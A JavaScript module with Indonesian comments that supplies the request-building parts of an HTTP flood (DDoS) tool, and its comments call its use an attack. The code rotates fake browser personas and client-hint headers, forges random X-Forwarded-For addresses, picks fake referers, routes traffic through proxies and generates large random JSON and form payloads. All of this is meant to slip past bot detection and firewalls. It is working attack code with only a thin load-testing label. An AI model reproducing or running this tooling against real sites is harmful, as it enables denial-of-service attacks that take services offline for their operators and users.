const crypto = require('crypto');
const { URLSearchParams } = require('url');

// Daftar proxy yang akan digunakan.
// Proxy buatan sendiri akan ditambahkan ke daftar ini secara otomatis saat serangan dimulai.
const proxyList = [];

// --- Sistem Persona Browser ---
// Setiap persona menggabungkan User-Agent, Client-Hints, dan profil TLS yang konsisten.
const browserPersonas = [
    {
        id: 'chrome_124',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        sec_ch_ua: '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        platform: '"Windows"'
    },
    {
        id: 'firefox_125',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
        // Firefox tidak mengirim Sec-CH-UA, jadi kita biarkan kosong.
    },
    {
        id: 'safari_17_2',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
    },
    {
        id: 'chrome_120',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        sec_ch_ua: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        platform: '"macOS"',
    },
    {
        id: 'edge_124',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.2478.80',
        sec_ch_ua: '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
        platform: '"Windows"',
    },
    {
        id: 'firefox_125_mac',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
        // Firefox on Mac
    }
];

// Daftar referer yang lebih beragam untuk bypass
const referers = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.instagram.com/",
    "https://www.twitter.com/",
    "https://t.co/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/",
];

// Helper untuk memilih item acak dari array
const randomChoice = (arr) => arr[Math.floor(Math.random() * arr.length)];

const accept_encoding_pool = ['gzip, deflate, br, zstd', 'gzip, deflate, br', 'gzip, deflate'];
const sec_fetch_dest_pool = ['document', 'empty', 'script', 'style', 'image', 'font'];
const device_memory_pool = ['1', '2', '4', '8'];
const viewport_width_pool = ['1920', '1680', '1440', '1366', '2560'];

function getDynamicAcceptHeader(fetchDest) {
    switch (fetchDest) {
        case 'document':
        case 'iframe':
            return 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
        case 'script':
        case 'style':
        case 'font':
            return '*/*';
        case 'image':
            return 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8';
        case 'empty': // Typically for fetch/XHR
            return 'application/json, text/plain, */*';
        default:
            return '*/*';
    }
}

function getAxiosOptions(target, proxyString, signal) {
    const persona = randomChoice(browserPersonas);
    const fetchDest = randomChoice(sec_fetch_dest_pool);

    const headers = {
        'User-Agent': persona.ua,
        'Accept': getDynamicAcceptHeader(fetchDest),
        'Accept-Encoding': randomChoice(accept_encoding_pool),
        'Accept-Language': generateRealisticAcceptLanguage(),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'keep-alive',
        // Header sidik jari perangkat
        'Device-Memory': randomChoice(device_memory_pool),
        'Viewport-Width': randomChoice(viewport_width_pool),
        // Header Sec-Fetch untuk konteks
        'Sec-Fetch-Dest': fetchDest,
        'Sec-Fetch-User': '?1',
        // Header Spoofing & Bypass
        'X-Forwarded-For': `${crypto.randomInt(1, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(1, 255)}`,
        'X-Forwarded-Proto': 'https',
    };

    // Tambahkan header Client-Hints jika persona mendukungnya
    if (persona.sec_ch_ua) {
        headers['sec-ch-ua'] = persona.sec_ch_ua;
        headers['sec-ch-ua-mobile'] = '?0';
        headers['sec-ch-ua-platform'] = persona.platform;
    }

    // Atur Sec-Fetch-Site, Mode, dan Referer secara dinamis
    const siteChoice = Math.random();
    if (siteChoice < 0.5) { // 50% - Navigasi dari luar
        headers['Sec-Fetch-Site'] = 'none';
        headers['Sec-Fetch-Mode'] = 'navigate';
    } else if (siteChoice < 0.8) { // 30% - Request dari halaman yang sama
        headers['Sec-Fetch-Site'] = 'same-origin';
        headers['Sec-Fetch-Mode'] = 'cors';
        headers['Referer'] = `${target.protocol}//${target.host}/${crypto.randomBytes(4).toString('hex')}`;
    } else { // 20% - Request dari situs lain
        headers['Sec-Fetch-Site'] = 'cross-site';
        headers['Sec-Fetch-Mode'] = 'cors';
        headers['Referer'] = randomChoice(referers);
    }

    // Simulasikan request AJAX
    if (fetchDest === 'empty') {
        headers['X-Requested-With'] = 'XMLHttpRequest';
    }

    const options = {
        headers: headers,
        timeout: 15000,
        signal: signal,
    };

    // Konfigurasi proxy untuk Axios
    if (proxyString) {
        const proxyUrl = new URL(proxyString);
        options.proxy = {
            protocol: proxyUrl.protocol.replace(':', ''),
            host: proxyUrl.hostname,
            port: parseInt(proxyUrl.port, 10),
        };
        if (proxyUrl.username && proxyUrl.password) {
            options.proxy.auth = { username: proxyUrl.username, password: proxyUrl.password };
        }
    }
    return options;
}

function generateRealisticAcceptLanguage() {
    const languages = [
        { code: 'en-US', q: 1.0 }, { code: 'en', q: 0.9 },
        { code: 'de', q: 0.8 }, { code: 'fr', q: 0.7 },
        { code: 'es', q: 0.6 }, { code: 'id', q: 0.5 }
    ];
    // Acak urutan dan ambil 2-4 bahasa
    const shuffled = languages.sort(() => 0.5 - Math.random());
    const count = 2 + Math.floor(Math.random() * 3);
    return shuffled.slice(0, count).map(lang => `${lang.code};q=${lang.q}`).join(',');
}

function generateUrlEncodedPayload() {
    const params = new URLSearchParams();
    const fieldCount = 5 + Math.floor(Math.random() * 10); // 5 to 15 fields
    for (let i = 0; i < fieldCount; i++) {
        const key = crypto.randomBytes(4 + Math.floor(Math.random() * 4)).toString('hex'); // key length 4-7
        const value = crypto.randomBytes(10 + Math.floor(Math.random() * 40)).toString('hex'); // value length 10-49
        params.append(key, value);
    }
    return params.toString();
}

function generateComplexJsonPayload() {
    const data = {
        id: crypto.randomUUID(),
        timestamp: Date.now(),
        user: {
            userId: crypto.randomBytes(16).toString('hex'),
            session: crypto.randomBytes(32).toString('hex'),
            attributes: {}
        },
        data: [],
        metadata: {
            source: "synthetic-load-generator",
            traceId: crypto.randomUUID(),
            schemaVersion: "1.2.0",
            clientInfo: {
                type: "web",
                os: ["windows", "macos", "linux"][Math.floor(Math.random()*3)],
                browser: ["chrome", "firefox", "safari"][Math.floor(Math.random()*3)]
            }
        }
    };
    for (let i = 0; i < 25; i++) {
        data.user.attributes[`attr_${i}`] = crypto.randomBytes(20).toString('hex');
        data.data.push({ key: crypto.randomBytes(10).toString('hex'), value: crypto.randomBytes(100).toString('hex') });
    }
    return JSON.stringify(data);
}

const getRandomPayload = () => {
    const choice = Math.random();
    if (choice < 0.5) { // 50% JSON
        return {
            // Buat payload on-the-fly untuk menghemat memori, jangan gunakan pool.
            payload: JSON.parse(generateComplexJsonPayload()),
            type: 'json'
        };
    } else { // 50% URL Encoded
        return {
            payload: new URLSearchParams(generateUrlEncodedPayload()),
            type: 'form'
        };
    }
};

module.exports = {
    proxyList,
    browserPersonas,
    getRandomPayload,
    getAxiosOptions
};